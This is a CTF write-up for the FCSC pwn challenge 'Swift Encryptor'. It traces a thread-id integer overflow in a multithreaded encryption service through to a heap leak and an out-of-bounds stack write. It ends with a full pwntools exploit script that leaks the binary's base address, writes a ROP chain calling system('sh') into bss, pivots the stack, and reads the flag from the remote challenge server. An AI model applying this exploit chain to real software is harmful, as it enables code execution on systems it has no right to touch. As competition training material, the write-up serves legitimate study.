# Pwn - Swift Encryptor

- Difficulty: :star::star::star:
- Solves: 7
- Points: 485
- Author: Quanthor_ic

> !!! Nouveau !!! Service de chiffrement ultra moderne:
>    - algorithmes cryptographiques post-quantiques military grade !
>    - multi-threading ultra rapide !
>    - protections contre les corruptions mémoire !

### Files

- `swift-encryptor`, main binary
- Dockerfiles
- source code

## Overview

The program waits for a base64 input and output the encrypted data.
```
$ ./swift-encryptor

Swift Encryptor

> aaaa
[interface] OK
[decoder] OK
[splitter] OK
[joiner] OK
[encoder] N/lZPbknb27Y1c7rHg51jQ==
> 
```

I first ran a script on the docker to retrieve the libc and ld, `checksec` doesn't show any suspicious stuff.

## Analysis

The source code is given in the attached files, it is a multithreaded program that uses different thread to process our input.
Those threads communicates using a queue of `struct msg`:
```c
struct msg {
    struct msg* next_msg; // queue
    unsigned char src; // sender id of message
    unsigned char dst; // thread id destination
    char data[];
};
```

The interface thread receives our input, sends it to the decoder thread and wait until it receives a specific message (message with first byte == 1). \
Our input is then base64 decoded by the decoder thread and sent to the splitter thread. \
From now on, the `msg` structs used will put the data size in the first 2 bytes:
```c
s_msg = create_msg(TID_DECODER, TID_SPLITTER, res_size+2);
*(u_short*)s_msg->data = res_size;
memcpy(s_msg->data+2, dec, res_size);
send_msg(s_msg);
```
The splitter thread splits our input into 0x10 sized chunks and creates this many worker threads to encrypts them (xor). It also creates the joiner thread for later. \
The worker threads (encryptor threads) encrypts the data and send it to the joiner (with its worker id in the first 2 bytes.). \
The worker id will be used in the joiner to merge the encrypted chunks into one, note that the joiner doesn't check the bound of the worker id when writing in the stack allocated joining buffer. \
Finally the joiner sends its buffer to the encoder thread to base64 encode it and sends a final message to the interface thread.

## Bug hunting

I did not see the bug immediatly, I assumed the bug was probably a race condition so I tried sending a large input `b64encode("A"*0x1000)`. \
It did trigger a bug, but it was working every time so maybe not a race condition after all. \
It appears that we are receiving too many bytes (the length of the output after `b64decode()` is 0x4141). So we are clearly controlling a size variable somewhere with our large input. \
The received data is also containing a heap leak:
```
0x00: 0000000000000000
0x01: 0000000000000000
0x02: 0000000000000000
0x03: 0000000000000035
0x04: 00000007f8edc01b
0x05: 415ad860864c1a5a
0x06: 0000000000000000
0x07: 0000000000000000
0x08: 0000000000000000
0x09: 0000000000000035
0x0a: 00007f8924ec798b
0x0b: 415ad860864c1a5a
0x0c: 4141414141414141
0x0d: 0000000000004141
0x0e: 0000000000000000
0x0f: 0000000000000035
0x10: 00007f8924ec79eb
0x11: 415ad860864c1a5a
0x12: 4141414141414141
0x13: 0000000000004141
0x14: 0000000000000000
...
```
We can recognize the chunk sizes (with the NON_MAIN_ARENA bit set) and the tcache key. These are `msg` structs containing our split data. \
This means that the bug happened after the encryption thread.

Since the author gave us the source code, I modified it to print the data size along with the thread sender of the message received by the encoder thread.
The encoder thread is receiving a message from the joiner thread but we learn that it is also receiving one from the splitter thread with size `0x4141`. \

I found the bug later when printing the worker ids in the splitter thread loop:
```
...
sending to worker 252 // (252)
sending to worker 253 // (253)
sending to worker 254 // (254)
sending to worker 255 // (255)
sending to worker 256 // (0)
sending to worker 257 // (1)
sending to worker 258 // (2)
sending to worker 259 // (3)
sending to worker 260 // (4)
[splitter] AAAAAAAAAAAAAAA
[decoder] OK
[splitter] OK
decsize 0x4141 from splitter
...
```
It starts breaking around 256, there is an integer overflow because the thread destination is stored in a unsigned char. So sending to worker 260 will actually send the data to thread 4 (encoder).
The encoder is expecting the data size as a short at the beginning of the data but the splitter send our raw input. \
So we can arbitrarily send messages to any thread. We can send an empty message if we want a thread to ignore it (most of the threads have a length check at the beggining that ignores the message if it is empty)

We saw in the analysis part that the joiner doesn't have any bound check when joining the chunks, so we can make write data outside of the stack allocated buffer by sending fake messages to the joiner thread.

## Exploiting

### Getting a leak

The first step of our exploit will be leaking ASLR by sending fake messages to the encoder with huge sizes (like we did at the beginning). \
I inspected the heap in gdb to look for pointers I could leak. This heap is mmap-ed due to the multiple arenas so leaking a heap pointer could give us a libc leak. \
Unfortunately, the offset seems to change so I decided to leak the binary address of the `thread` struct instead since `system()` is in the `plt` and the binary has enough gadgets.
```c
struct thread {
    unsigned int id;
    unsigned char stop;
    void* thread_main; // <- exe pointer
    pthread_t pthread;
    pthread_mutex_t mutex;
    pthread_cond_t cond;
    struct msg* queue;
};
```
Most of the `thread` structs on the heap are encryptor threads so we expect a pointer to the `encryptor_thread()` function (`0x...119`). \
Leaking the heap won't always give us a `thread` struct (the first payload actually only contains tcache followed by the top chunk) so I decided to put this in a loop until we get a leak.

### Getting code execution

As said before, sending fake messages to the joiner thread will result in a out of bound stack write.
We can use it to rewrite the saved `rbp` and return address. We can only write 14 bytes though, I still tried to overwrite it but `rdi` isn't pointing to something useful when returning so we will have to pivot on a larger rop chain.

The joiner thread stores a pointer to the joining buffer, we can rewrite it to redirect the buffer anywhere and gain arbitrary write. Now we are able to write a rop chain in `bss` with multiple messages (Overflow once to rewrite the buffer pointer, then overflow again to ~512 to write what we want) and pivot on it.

## Exploit

```py
from pwn import *
import pwn
import random as rnd
import base64 as b64
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

file = './swift-encryptor'
exe_args = []
PREFIX = (b": ", b"> ")
speed = 0.2

io: process = None

def debug(pid=io):
    gdb.attach(pid, gdbscript=
    """
    
    """, exe=file)
    input("debug")

def launch_remote():
    global file, io
    host = args.HOST if args.HOST else 'chall.fcsc.fr'
    port = args.PORT if args.PORT else 2104
    io = remote(host, port)

def launch_docker():
    global file, io
    io = remote("localhost", 2104)
    if args.GDB:
        out = subprocess.run(["pgrep", "--newest", "^None$"], capture_output=True)
        debug(int(out.stdout))

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug(io)

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rol(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: ror(addr, 17) ^ cookie
ptr_getcookie = lambda mangled, demangled: ptr_demangle(mangled, demangled)
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def printx(**kwargs):
    for k, v in kwargs.items():
        success("%s: %#x" % (k, v))

def launch():
    if args.REMOTE:
        l = launch_remote
    elif args.DOCKER:
        l = launch_docker
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = exe.libc
context.binary = exe

tries = 0

def exploit():
    def msg(num, data):
        return p16(num) + data[:14].ljust(14, b"\0")

    while True:
        payload = b"A"*0x10*251
        payload += flat([
            0, 0, # to interface
            0, 0, # to decoder
            0, 0, # to splitter
            0, 0, # to joiner 

            0x1000, 0, # to encoder thread, data size = 0x1000 -> heap leak
        ])
        slaprefix(b64.b64encode(payload))

        recvu(b"[encoder] ")
        leak = recvu(b"\n", True)
        leak = b64.b64decode(leak)
        leaks = []
        for i, c in enumerate(sliced(leak[4:], 8)):
            leaks.append(u64(c))
            # print("%#04x: %016x" % (i, u64(c)))

        for i, l in enumerate(leaks[:-2]):
            if l & ~0b1111 == 0x80 and (leaks[i+2] & 0xfff) == 0x119:
                exe.address = leaks[i+2] - 0x2119
        if exe.address != 0:
            break

    printx(exe=exe.address)
    key = b"\x5e\x5f\xc3\x3d\xb9\x27\x6f\x6e\xd8\xd5\xce\xeb\x1e\x0e\x75\x8d"

    leave_ret = exe.address + 0x00000000000015b0
    pop_rdi = exe.address + 0x00000000000020ad
    binsh_addr = exe.address+0x5820-8

    bss = exe.address + 0x5800

    payload = b""
    payload += xor(b"A"*0x10, key)*251
    payload += flat([
        0, 0, # sent to interface thread (id=256=0)
        0, 0, # sent to decoder (NULL so it will ignore)
        0, 0, # sent to splitter (ignore too)
        
        # sent to joiner
        # rewrite buffer pointer of joiner thread (at buffer+0x10*0x204) with bss (for future stack pivot)
        msg(0x204, p64(bss) + p64(0)),

        0, 0, # sent to encoder (ignore too)
    ])
    payload += xor(b"A"*0x10, key)*251
    payload += flat([
        1, 0,
        0, 0,
        0, 0,

        msg(0, p64(pop_rdi) + p64(binsh_addr)), # write at bss+0x10*0

        0, 0,
    ])
    slaprefix(b64.b64encode(payload))

    payload = b""
    payload += xor(b"A"*0x10, key)*251
    payload += flat([
        0, 0,
        0, 0,
        0, 0,

        # rewrite buffer pointer of joiner thread (at buffer+0x10*0x204) with bss (for future stack pivot)
        msg(0x204, p64(bss) + p64(0)),

        0, 0,
    ])
    payload += xor(b"A"*0x10, key)*251
    payload += flat([
        1, 0,
        0, 0,
        0, 0,

        msg(1, p64(exe.plt.system) + b"sh"), # write at bss+0x10*1

        0, 0,
    ])
    slaprefix(b64.b64encode(payload))



    payload = b""
    payload += xor(b"A"*0x10, key)*251
    payload += flat([
        1, 0,
        0, 0,
        0, 0,

        # buffer+0x10*0x106 = saved rbp & rip
        msg(0x106, p64(bss-8) + p64(leave_ret)), # rbp & rip

        0, 0,
    ])
    slaprefix(b64.b64encode(payload))

    slaprefix(b"aaaa") # trigger another encryption -> will force last joiner to exit -> execute our ropchain
    sl(b"cat fla*")

    io.interactive()
    exit()

if not args.BF:
    launch()
    exploit()
    exit()
else:
    tries_prog = log.progress("Tries")
    while True:
        tries += 1
        tries_prog.status(str(tries))

        launch()
        try:
            exploit()
        except EOFError:
            pass

        with context.local(log_level=logging.ERROR):
            io.close()
```

```
$ python3 exploit.py REMOTE
[+] exe: 0xcb4fd008000
[*] Switching to interactive mode
[interface] OK
[splitter] OK
[decoder] OK
FCSC{9eb0c4343fc8774fc64a728c27912dad789a7ba561fe726d2a669306bf8f429c}
```

# Conclusion

Great challenge, it scared me at first because of the threading but I had a fun time exploiting it in the end and learned new stuff since challenges involving threading are pretty rare.